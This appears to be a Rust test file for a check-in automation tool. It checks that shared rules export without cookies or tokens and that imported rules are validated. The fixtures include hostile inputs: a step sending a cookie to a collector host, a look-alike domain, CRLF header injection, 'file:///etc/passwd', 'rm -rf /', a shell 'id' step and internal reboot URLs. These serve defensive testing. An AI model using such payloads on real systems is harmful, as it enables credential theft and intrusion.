//! Rules: what leaves in a share, and what a pasted rule can and cannot
//! do.

mod support;

use base64::Engine as _;
use meow_checkin::rule::{self, LINK_PREFIX, RULE_TEXT_MAX};
use meow_checkin::{Engine, EngineConfig, ErrorKind, SystemClock, SystemConnector};
use serde_json::{json, Value};
use std::sync::Arc;

fn engine(dir: &std::path::Path) -> Arc<Engine> {
    Engine::open(
        dir,
        Arc::new(SystemConnector),
        Arc::new(SystemClock),
        EngineConfig::default(),
    )
}

fn sample() -> Value {
    json!({
        "paopao_checkin_rule": 1,
        "name": "主力机场",
        "home": "https://main.example.com/user",
        "access": "proxy",
        "minute_of_day": 510,
        "variables": [
            {"name": "cookie", "source": "auto", "from": "cookie_header",
             "url": "https://main.example.com/"},
            {"name": "uid", "source": "manual"}
        ],
        "steps": [
            {"kind": "api", "name": "签到", "method": "POST",
             "url": "https://main.example.com/user/checkin?u={uid}",
             "headers": {"cookie": "{cookie}"}, "body": null, "body_base64": false,
             "page": "https://main.example.com/user",
             "recorded_status": 200, "recorded_content_type": "application/json"},
            {"kind": "click", "name": "领取流量包",
             "page": "https://main.example.com/user",
             "locators": [{"kind": "role_text", "value": "领取流量包"}],
             "text": "领取流量包", "tag": "button"}
        ]
    })
}

fn check(rule: &Value) -> meow_checkin::model::RuleCheck {
    rule::check_rule(&rule.to_string())
}

fn codes(c: &meow_checkin::model::RuleCheck) -> Vec<&'static str> {
    c.warnings.iter().map(|w| w.code).collect()
}

#[test]
fn a_rule_reads_as_the_format_says() {
    let c = check(&sample());
    assert!(c.ok, "{:?}", c.error);
    assert_eq!(c.name, "主力机场");
    assert_eq!(c.home, "https://main.example.com/user");
    assert_eq!(c.steps.len(), 2);
    assert!(c.steps.iter().all(|s| s.id().is_empty()));
    assert_eq!(c.variables.len(), 2);
    assert_eq!(codes(&c), ["manual_variables"]);
    assert_eq!(c.warnings[0].detail, "uid");
    let v = serde_json::to_value(&c).unwrap();
    assert_eq!(v["error"], Value::Null);
    assert_eq!(v["steps"][0]["kind"], "api");
    assert_eq!(
        v["variables"][1],
        json!({"name": "uid", "source": "manual"})
    );
}

#[test]
fn the_link_and_the_text_carry_the_same_rule() {
    let text = sample().to_string();
    for encoder in [
        base64::engine::general_purpose::URL_SAFE,
        base64::engine::general_purpose::URL_SAFE_NO_PAD,
    ] {
        let link = format!("{LINK_PREFIX}{}", encoder.encode(&text));
        let c = rule::check_rule(&format!("  {link}\n"));
        assert!(c.ok, "{:?}", c.error);
        assert_eq!(c.steps.len(), 2);
    }
    assert!(!rule::check_rule(&format!("{LINK_PREFIX}!!!not base64")).ok);
    assert!(!rule::check_rule(&format!("{LINK_PREFIX}aGVsbG8")).ok);
}

#[test]
fn export_holds_no_value_and_reads_back() {
    let dir = tempfile::tempdir().unwrap();
    let e = engine(dir.path());
    let imported = e.import_rule(&sample().to_string(), true).unwrap();
    // The line the task uses is this user's own: not part of the rule.
    e.update_task(&imported.id, &json!({"policy": "香港 01"}), true)
        .unwrap();
    e.save_variable(
        &imported.id,
        "uid",
        &json!({"name": "uid", "source": "manual", "value": "MANUALSECRET"}),
        true,
    )
    .unwrap();
    e.push_variables(
        &imported.id,
        &json!({"values": {"cookie": "sid=COOKIESECRET"}, "user_agent": "UASECRET"}),
    )
    .unwrap();

    let export = e.export_rule(&imported.id).unwrap();
    assert_eq!(export.file_name, "主力机场.checkin.json");
    assert!(export.link.starts_with(LINK_PREFIX));
    for carrier in [&export.text, &export.link] {
        let c = rule::check_rule(carrier);
        assert!(c.ok);
        let again = serde_json::to_string(&c).unwrap();
        for secret in ["MANUALSECRET", "COOKIESECRET", "UASECRET"] {
            assert!(!carrier.contains(secret));
            assert!(!again.contains(secret));
        }
    }
    let link_json = String::from_utf8(
        base64::engine::general_purpose::URL_SAFE_NO_PAD
            .decode(export.link.trim_start_matches(LINK_PREFIX))
            .unwrap(),
    )
    .unwrap();
    assert!(!link_json.contains("SECRET"));

    // Nothing personal in the text: exactly the fields of the format.
    let rule: Value = serde_json::from_str(&export.text).unwrap();
    let keys: Vec<&str> = rule
        .as_object()
        .unwrap()
        .keys()
        .map(String::as_str)
        .collect();
    let mut sorted = keys.clone();
    sorted.sort_unstable();
    assert_eq!(
        sorted,
        [
            "access",
            "home",
            "minute_of_day",
            "name",
            "paopao_checkin_rule",
            "steps",
            "variables"
        ]
    );
    assert!(rule["steps"][0].get("id").is_none());
    assert_eq!(
        rule["variables"][1],
        json!({"name": "uid", "source": "manual"})
    );
    // The same rule comes back out of what went in.
    assert_eq!(rule, sample());
}

#[test]
fn export_refuses_a_login_written_into_a_header() {
    let dir = tempfile::tempdir().unwrap();
    let e = engine(dir.path());
    let id = e
        .create_task(&json!({"home": "https://a.example/"}), false)
        .unwrap()
        .id;
    for (header, value, refused) in [
        ("authorization", "Bearer abc.def.ghi", true),
        ("cookie", "sid=1", true),
        ("x-csrf-token", "tok", true),
        ("authorization", "Bearer {token}", false),
        ("cookie", "{cookie}", false),
        ("x-requested-with", "XMLHttpRequest", false),
    ] {
        e.save_steps(
            &id,
            &json!({"steps": [{"kind": "api", "id": "", "name": "s", "method": "GET",
                "url": "https://a.example/x", "page": "https://a.example/",
                "headers": {header: value}}]}),
            false,
        )
        .unwrap();
        let out = e.export_rule(&id);
        assert_eq!(out.is_err(), refused, "{header}: {value}");
        if let Ok(out) = out {
            assert!(out.text.contains(value));
        }
    }
}

#[test]
fn import_creates_a_task_that_is_off_and_has_no_value() {
    let dir = tempfile::tempdir().unwrap();
    let e = engine(dir.path());
    // The rule tries to switch itself on and to bring values along.
    let mut rule = sample();
    rule["enabled"] = json!(true);
    rule["id"] = json!("t-evil");
    rule["subscription_id"] = json!("sub");
    // Nor does it choose which of this core's lines the task uses.
    rule["policy"] = json!("REJECT");
    assert!(check(&rule)
        .warnings
        .iter()
        .all(|w| w.code != "unknown_field"));
    rule["variables"][0]["value"] = json!("sid=planted");
    rule["variables"][0]["has_value"] = json!(true);
    rule["variables"][1]["value"] = json!("planted");
    rule["steps"][0]["id"] = json!("s-evil");

    let task = serde_json::to_value(e.import_rule(&rule.to_string(), true).unwrap()).unwrap();
    assert_eq!(task["enabled"], false);
    assert_ne!(task["id"], "t-evil");
    assert_eq!(task["subscription_id"], Value::Null);
    assert_eq!(task["policy"], Value::Null);
    assert_ne!(task["steps"][0]["id"], "s-evil");
    assert!(!task["steps"][0]["id"].as_str().unwrap().is_empty());
    for v in task["variables"].as_array().unwrap() {
        assert_eq!(v["has_value"], false);
        assert_eq!(v["updated_at"], Value::Null);
    }
    assert_eq!(task["variables"][1]["value"], "");
    // Unfilled manual variable: it does not run, by hand or by 全部执行.
    let id = task["id"].as_str().unwrap();
    assert_eq!(e.run_task(id, false).unwrap_err().kind, ErrorKind::Conflict);
    assert_eq!(e.run_all(), 0);
    assert!(e.tick().is_empty());
    let snap = e.snapshot(false);
    assert!(snap.queued_task_ids.is_empty());
    assert!(snap.runs.is_empty());
}

#[tokio::test]
async fn checking_and_importing_send_nothing() {
    let server = support::Server::start(|_| support::Reply::json(200, "{}")).await;
    let connector = support::LocalConnector::new(server.addr);
    let dir = tempfile::tempdir().unwrap();
    let e = Engine::open(
        dir.path(),
        connector.shared(),
        Arc::new(SystemClock),
        support::quick_config(),
    );
    let _tasks = e.start();
    let mut rule = sample();
    rule["variables"] = json!([]);
    rule["steps"][0]["url"] = json!("http://127.0.0.1:9090/configs");
    rule["steps"][0]["headers"] = json!({});
    assert!(e.check_rule(&rule.to_string()).ok);
    e.import_rule(&rule.to_string(), false).unwrap();
    e.run_all();
    e.tick();
    tokio::time::sleep(std::time::Duration::from_millis(150)).await;
    assert!(server.seen().is_empty());
    assert!(connector.hosts().is_empty());
}

#[test]
fn a_step_to_another_site_is_called_out() {
    let mut rule = sample();
    rule["steps"].as_array_mut().unwrap().extend([
        json!({"kind": "api", "name": "上报", "method": "POST",
               "url": "https://collector.example/c?d={cookie}",
               "page": "https://main.example.com/user"}),
        json!({"kind": "api", "name": "上报2", "method": "GET",
               "url": "https://collector.example/again",
               "page": "https://main.example.com/user"}),
        // A sibling host of the same site is not another site.
        json!({"kind": "api", "name": "接口", "method": "GET",
               "url": "https://api.example.com/x",
               "page": "https://main.example.com/user"}),
        // Looks alike, is not.
        json!({"kind": "api", "name": "像", "method": "GET",
               "url": "https://main.example.com.evil.example/x",
               "page": "https://main.example.com/user"}),
    ]);
    let c = check(&rule);
    assert!(c.ok);
    let cross: Vec<&str> = c
        .warnings
        .iter()
        .filter(|w| w.code == "cross_site")
        .map(|w| w.detail.as_str())
        .collect();
    assert_eq!(
        cross,
        ["collector.example", "main.example.com.evil.example"]
    );
    assert!(c.warnings[0].message.contains("collector.example"));
    assert!(c.warnings[0].message.contains("main.example.com"));
}

#[test]
fn a_variable_reading_another_sites_login_is_called_out() {
    let mut rule = sample();
    rule["variables"][0]["url"] = json!("https://bank.example/");
    let c = check(&rule);
    assert!(c.ok);
    let w = c
        .warnings
        .iter()
        .find(|w| w.code == "cross_site_variable")
        .unwrap();
    assert_eq!(w.detail, "bank.example");
}

#[test]
fn unknown_fields_are_dropped_and_reported_once() {
    let mut rule = sample();
    rule["on_import"] = json!("rm -rf /");
    rule["steps"][0]["script"] = json!("alert(1)");
    rule["steps"][1]["locators"][0]["weight"] = json!(3);
    rule["variables"][0]["secret"] = json!(true);
    rule["steps"]
        .as_array_mut()
        .unwrap()
        .push(json!({"kind": "shell", "command": "id"}));
    let c = check(&rule);
    assert!(c.ok);
    assert_eq!(
        codes(&c).iter().filter(|c| **c == "unknown_field").count(),
        1
    );
    let w = c
        .warnings
        .iter()
        .find(|w| w.code == "unknown_field")
        .unwrap();
    for field in ["on_import", "script", "weight", "secret"] {
        assert!(w.detail.contains(field), "{field} in {}", w.detail);
    }
    // The unknown step kind is left out; nothing unknown is kept.
    assert_eq!(c.steps.len(), 2);
    let kept = serde_json::to_string(&c.steps).unwrap();
    for gone in ["script", "alert", "weight", "shell", "command"] {
        assert!(!kept.contains(gone), "{gone}");
    }
}

#[test]
fn references_nobody_defined_become_variables_to_fill_in() {
    let mut rule = sample();
    rule["variables"] = json!([]);
    let c = check(&rule);
    assert!(c.ok);
    let names: Vec<&str> = c.variables.iter().map(|v| v.name.as_str()).collect();
    assert_eq!(names, ["uid", "cookie"]);
    assert_eq!(
        c.warnings.last().unwrap().detail,
        "uid, cookie",
        "{:?}",
        c.warnings
    );
}

#[test]
fn a_login_written_into_a_rule_is_called_out() {
    let mut rule = sample();
    rule["steps"][0]["headers"] = json!({"authorization": "Bearer abc.def", "cookie": "{cookie}"});
    let c = check(&rule);
    assert!(c.ok);
    let w = c
        .warnings
        .iter()
        .find(|w| w.code == "embedded_credential")
        .unwrap();
    assert_eq!(w.detail, "authorization");
}

fn refused(rule: &Value) -> String {
    let c = check(rule);
    assert!(!c.ok, "accepted: {rule}");
    assert!(c.steps.is_empty() && c.variables.is_empty() && c.warnings.is_empty());
    c.error.expect("a sentence")
}

#[test]
fn what_is_not_a_rule_is_refused() {
    for text in [
        "",
        "hello",
        "[]",
        "42",
        "null",
        "{}",
        r#"{"paopao_checkin_rule": "1", "home": "https://a.example/"}"#,
        r#"{"paopao_checkin_rule": 1}"#,
        r#"{"paopao_checkin_rule": 1.5, "home": "https://a.example/"}"#,
        r#"{"paopao_checkin_rule": true, "home": "https://a.example/"}"#,
    ] {
        let c = rule::check_rule(text);
        assert!(!c.ok, "{text}");
        assert!(c.error.is_some());
    }
    // A newer format says so.
    let c = rule::check_rule(r#"{"paopao_checkin_rule": 2, "home": "https://a.example/"}"#);
    assert!(c.error.unwrap().contains("更新"));
}

#[test]
fn addresses_that_are_not_http_are_refused() {
    for home in [
        json!("javascript:alert(1)"),
        json!("file:///etc/passwd"),
        json!("ftp://a.example/"),
        json!("https://"),
        json!("//a.example/"),
        json!("https://user:pw@a.example/"),
        json!(""),
        json!(null),
        json!(7),
        json!(["https://a.example/"]),
    ] {
        let mut rule = sample();
        rule["home"] = home;
        refused(&rule);
    }
    for (field, value) in [
        ("url", json!("file:///etc/passwd")),
        ("url", json!("gopher://a.example/")),
        ("url", json!("https://{host}/x")),
        ("url", json!("/relative")),
        ("page", json!("javascript:void(0)")),
        ("page", json!("")),
    ] {
        let mut rule = sample();
        rule["steps"][0][field] = value.clone();
        refused(&rule);
    }
    let mut rule = sample();
    rule["steps"][1]["page"] = json!("data:text/html,x");
    refused(&rule);
}

#[test]
fn wrong_types_are_refused() {
    let cases: Vec<(&str, Value)> = vec![
        ("/name", json!(5)),
        ("/access", json!("tor")),
        ("/access", json!(1)),
        ("/minute_of_day", json!("510")),
        ("/minute_of_day", json!(1440)),
        ("/minute_of_day", json!(-1)),
        ("/minute_of_day", json!(1.5)),
        ("/steps", json!("all")),
        ("/steps", json!({"0": {}})),
        ("/steps/0", json!("api")),
        ("/steps/0/kind", json!(1)),
        ("/steps/0/method", json!("TRACE")),
        ("/steps/0/method", json!("GET /x HTTP/1.1\r\nHost: evil")),
        ("/steps/0/headers", json!([["cookie", "x"]])),
        ("/steps/0/headers", json!({"cookie": 1})),
        ("/steps/0/headers", json!({"cookie": ["a"]})),
        ("/steps/0/body", json!({"a": 1})),
        ("/steps/0/body_base64", json!("yes")),
        ("/steps/0/recorded_status", json!("200")),
        ("/steps/0/recorded_status", json!(99999)),
        ("/steps/1/locators", json!("css")),
        ("/steps/1/locators/0", json!("css")),
        ("/steps/1/locators/0/value", json!(1)),
        ("/steps/1/locators/0/kind", json!("css; drop")),
        ("/variables", json!({"cookie": {}})),
        ("/variables/0", json!("cookie")),
        ("/variables/0/name", json!("1bad")),
        ("/variables/0/name", json!("has space")),
        ("/variables/0/name", json!("a".repeat(41))),
        ("/variables/0/source", json!("magic")),
        ("/variables/0/from", json!("keychain")),
        ("/variables/0/url", json!("file:///etc/passwd")),
        ("/variables/0/key", json!(3)),
        ("/variables/1/name", json!("cookie")),
    ];
    for (pointer, value) in cases {
        let mut rule = sample();
        let (parent, key) = pointer.rsplit_once('/').unwrap();
        match rule.pointer_mut(parent).unwrap() {
            Value::Array(list) => list[key.parse::<usize>().unwrap()] = value.clone(),
            other => other[key] = value.clone(),
        }
        refused(&rule);
    }
    // base64 that is not.
    let mut rule = sample();
    rule["steps"][0]["body"] = json!("***");
    rule["steps"][0]["body_base64"] = json!(true);
    refused(&rule);
}

#[test]
fn header_injection_is_refused() {
    for headers in [
        json!({"x-a": "1\r\nx-evil: 1"}),
        json!({"x-a": "1\nx-evil: 1"}),
        json!({"x-a": "1\u{0}"}),
        json!({"x-a\r\nx-evil": "1"}),
        json!({"x a": "1"}),
        json!({"x-a:": "1"}),
        json!({"": "1"}),
        json!({"名": "1"}),
    ] {
        let mut rule = sample();
        rule["steps"][0]["headers"] = headers;
        refused(&rule);
    }
    // Headers that are the core's to write are dropped, whatever the case.
    let mut rule = sample();
    rule["steps"][0]["headers"] = json!({
        "Host": "evil.example", "Content-Length": "0", "Transfer-Encoding": "chunked",
        "User-Agent": "x", "Origin": "https://evil.example", "Referer": "https://evil.example/",
        "Sec-Fetch-Site": "same-origin", "Proxy-Authorization": "Basic x", "Connection": "keep-alive",
        "X-Requested-With": "XMLHttpRequest"
    });
    let c = check(&rule);
    assert!(c.ok);
    let v = serde_json::to_value(&c.steps[0]).unwrap();
    assert_eq!(v["headers"], json!({"x-requested-with": "XMLHttpRequest"}));
}

#[test]
fn oversize_input_is_refused() {
    // The text as a whole.
    let mut rule = sample();
    rule["name"] = json!("x".repeat(RULE_TEXT_MAX));
    let c = check(&rule);
    assert!(!c.ok);
    // The same through a link.
    let link = format!(
        "{LINK_PREFIX}{}",
        base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(rule.to_string())
    );
    assert!(!rule::check_rule(&link).ok);
    assert_eq!(
        rule::read_rule(&rule.to_string()).unwrap_err().kind,
        ErrorKind::TooLarge
    );

    let step = sample()["steps"][0].clone();
    let mut rule = sample();
    rule["steps"] = Value::Array(vec![step.clone(); 51]);
    refused(&rule);
    rule["steps"] = Value::Array(vec![step; 50]);
    assert!(check(&rule).ok);

    let mut rule = sample();
    rule["variables"] = Value::Array(
        (0..51)
            .map(|i| json!({"name": format!("v{i}"), "source": "manual"}))
            .collect(),
    );
    refused(&rule);

    let mut rule = sample();
    rule["steps"][0]["body"] = json!("x".repeat(64 * 1024 + 1));
    refused(&rule);
    rule["steps"][0]["body"] = json!("x".repeat(64 * 1024));
    assert!(check(&rule).ok);

    let mut rule = sample();
    rule["steps"][0]["headers"] = json!({"x-a": "v".repeat(8 * 1024 + 1)});
    refused(&rule);
    let mut rule = sample();
    rule["steps"][0]["headers"] =
        Value::Object((0..51).map(|i| (format!("x-h{i}"), json!("1"))).collect());
    refused(&rule);
    let mut rule = sample();
    rule["steps"][0]["url"] = json!(format!("https://main.example.com/{}", "a".repeat(5000)));
    refused(&rule);
    let mut rule = sample();
    rule["steps"][1]["locators"] = Value::Array(vec![json!({"kind": "css", "value": "a"}); 21]);
    refused(&rule);
    let mut rule = sample();
    rule["steps"][1]["locators"][0]["value"] = json!("a".repeat(4097));
    refused(&rule);

    // Deep nesting is a parse error, not a crash.
    let deep = format!("{}1{}", "[".repeat(5000), "]".repeat(5000));
    assert!(!rule::check_rule(&deep).ok);
    let deep_rule = format!(
        r#"{{"paopao_checkin_rule":1,"home":"https://a.example/","x":{}1{}}}"#,
        "[".repeat(5000),
        "]".repeat(5000)
    );
    assert!(!rule::check_rule(&deep_rule).ok);
}

#[test]
fn long_names_are_cut_not_refused() {
    let mut rule = sample();
    rule["name"] = json!("名".repeat(500));
    rule["steps"][1]["text"] = json!("字".repeat(5000));
    let c = check(&rule);
    assert!(c.ok);
    assert_eq!(c.name.chars().count(), 100);
}

#[test]
fn a_rule_pointing_inward_is_called_out() {
    let mut rule = sample();
    rule["steps"].as_array_mut().unwrap().extend([
        json!({"kind": "api", "name": "内网", "method": "POST",
               "url": "http://192.168.1.1/cgi-bin/reboot",
               "page": "https://main.example.com/user"}),
        json!({"kind": "api", "name": "本机", "method": "PUT",
               "url": "http://127.0.0.1:9090/configs",
               "page": "https://main.example.com/user"}),
        json!({"kind": "click", "name": "别处", "page": "https://other.example/claim",
               "locators": [{"kind": "css", "value": "#x"}]}),
    ]);
    let check = rule::check_rule(&rule.to_string());
    assert!(check.ok, "{:?}", check.error);
    let details = |code: &str| -> Vec<String> {
        check
            .warnings
            .iter()
            .filter(|w| w.code == code)
            .map(|w| w.detail.clone())
            .collect()
    };
    assert_eq!(details("private_address"), ["192.168.1.1", "127.0.0.1"]);
    // The page a click step opens counts as a place the rule goes to.
    assert!(details("cross_site").contains(&"other.example".to_string()));
    // A look-alike name must be spelled out.
    let mut rule = sample();
    rule["home"] = json!("https://m\u{430}in.example.com/user");
    assert!(!rule::check_rule(&rule.to_string()).ok);
}
